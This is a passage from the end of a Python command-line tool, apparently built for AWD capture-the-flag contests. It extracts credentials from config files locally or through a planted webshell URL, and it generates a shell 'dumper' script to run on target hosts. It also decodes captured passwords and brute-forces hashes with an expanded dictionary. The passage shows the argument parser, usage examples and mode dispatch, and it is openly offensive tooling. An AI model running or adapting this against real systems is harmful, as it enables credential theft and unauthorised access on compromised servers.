        return len(self.expanded)


def gen_expanded_dict(dict_path=None, output_path=None):
    """生成扩展字典并输出/保存"""
    dc = DictCracker(dict_path, auto_expand=True)
    base_count = len(dc.base_words) if dc.load() > 0 else 0
    # load 后 base_words 才有值
    base_count = len(dc.base_words)
    expanded_count = len(dc.expanded)

    if output_path:
        dc.save(output_path)
        print(f"{G}基础词: {base_count}  扩展后: {expanded_count}{N}")
        print(f"{G}已保存到: {output_path}{N}")
    else:
        # 输出到 stdout
        for w in sorted(dc.expanded):
            print(w)
        print(f"\n{G}# 基础词: {base_count}  扩展后: {expanded_count}{N}", file=sys.stderr)


# ================================================================
# Part 6: CLI
# ================================================================
def main():
    parser = argparse.ArgumentParser(
        description='AWD 凭据提取 & 密码逆向工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 1. 本地提取所有配置原码 + 自动逆向密码
  python3 %(prog)s --local

  # 2. 通过 webshell 远程提取
  python3 %(prog)s --webshell http://target/shell.php --pwd awd2024

  # 3. 生成靶机端 dumper (靶机没 python 时用)
  python3 %(prog)s --gen-dumper > dump.sh
  #    靶机执行: bash dump.sh > creds.txt
  #    再逆向: python3 %(prog)s --crack creds.txt

  # 4. 纯逆向: 直接解码一个密码字符串
  python3 %(prog)s --crack 'UmtzI1Qzc3QjU3RyMG5nX1BAJCUh'
  python3 %(prog)s --crack 'NTQzMjE='
  python3 %(prog)s --crack '6562633464663837'   # hex
        """
    )
    parser.add_argument('--local', action='store_true', help='本地提取原码')
    parser.add_argument('--webshell', metavar='URL', help='通过 webshell 远程提取')
    parser.add_argument('--pwd', default='awd2024', help='webshell 密码 (默认 awd2024)')
    parser.add_argument('--gen-dumper', action='store_true', help='生成靶机端 dumper shell 脚本')
    parser.add_argument('--crack', metavar='STRING_OR_FILE',
                        help='逆向解码: 传入密码字符串, 或 dumper 输出的文件路径')
    parser.add_argument('--dict', metavar='DICT_FILE', nargs='?', const=DEFAULT_DICT,
                        default=None,
                        help='指定密码字典 (默认 attack/password_dict.txt), 识别到哈希时自动爆破')
    parser.add_argument('--dictgen', metavar='OUTPUT_FILE', nargs='?', const='',
                        default=None,
                        help='生成扩展字典 (基础词+leet+后缀+大小写变换) 输出到文件或 stdout')
    args = parser.parse_args()

    # --dictgen 不带参数输出到 stdout 时, 不打印 banner (避免污染字典文件)
    # args.dictgen: None=未指定, ''=指定不带参数(输出到stdout), '路径'=输出到文件
    if args.dictgen is None:
        banner()

    # 模式 0: 生成扩展字典
    if args.dictgen is not None:
        gen_expanded_dict(args.dict, args.dictgen if args.dictgen else None)
        return

    # 模式 1: 生成 dumper
    if args.gen_dumper:
        gen_dumper()
        return

    # 模式 2: 纯逆向
    if args.crack:
        # 初始化字典爆破器 (如果 --dict 指定或默认字典存在)
        dc = None
        if args.dict:
            dc = DictCracker(args.dict, auto_expand=True)
            cnt = dc.load()
            if cnt > 0:
                print(f"{C}[*] 已加载密码字典: {args.dict} (基础 {len(dc.base_words)} 词, 扩展后 {cnt} 词){N}")
            else:
                print(f"{Y}[!] 字典加载失败或为空: {args.dict}{N}")
                dc = None
        cracker = PasswordCracker(dict_cracker=dc)
        if os.path.isfile(args.crack):
            # 从 dump 文件提取所有密码候选并逐个逆向
            print(f"{C}[*] 从 dump 文件提取密码: {args.crack}{N}")
            candidates, text = parse_dump_file(args.crack)
            if not candidates:
                # 直接把整个文件当密码字符串池 (按行)
                candidates = [l.strip() for l in text.split('\n')
                              if l.strip() and not l.startswith('#') and len(l.strip()) < 200]
                candidates = list(dict.fromkeys(candidates))[:50]
            print(f"{G}[*] 提取到 {len(candidates)} 个密码候选{N}")
            for pwd in candidates:
                cracker.analyze(pwd)
        else:
            # 单个字符串
            cracker.analyze(args.crack)
        return

    # 模式 3: 本地提取
    if args.local:
        ext = Extractor(local=True)
        ext.extract_all()
        pwds = ext.summary()
        if pwds:
            print(f"\n{B}🔑 对提取到的密码候选进行逆向分析...{N}")
            dc = DictCracker(auto_expand=True) if os.path.isfile(DEFAULT_DICT) else None
            if dc:
                dc.load()
                print(f"{C}[*] 已加载密码字典 (扩展后 {len(dc.expanded)} 词), 哈希将自动爆破{N}")
            cracker = PasswordCracker(dict_cracker=dc)
            for label, path, pwd in pwds:
                cracker.analyze(pwd)
        return

    # 模式 4: webshell 远程提取
    if args.webshell:
        ext = Extractor(local=False, webshell_url=args.webshell, webshell_pwd=args.pwd)
        ext.extract_all()
        pwds = ext.summary()
        if pwds:
            print(f"\n{B}🔑 对提取到的密码候选进行逆向分析...{N}")
            dc = DictCracker(auto_expand=True) if os.path.isfile(DEFAULT_DICT) else None
            if dc:
                dc.load()
                print(f"{C}[*] 已加载密码字典 (扩展后 {len(dc.expanded)} 词), 哈希将自动爆破{N}")
            cracker = PasswordCracker(dict_cracker=dc)
            for label, path, pwd in pwds:
                cracker.analyze(pwd)
        return

    # 无参数 → 帮助
    parser.print_help()


if __name__ == '__main__':
    main()
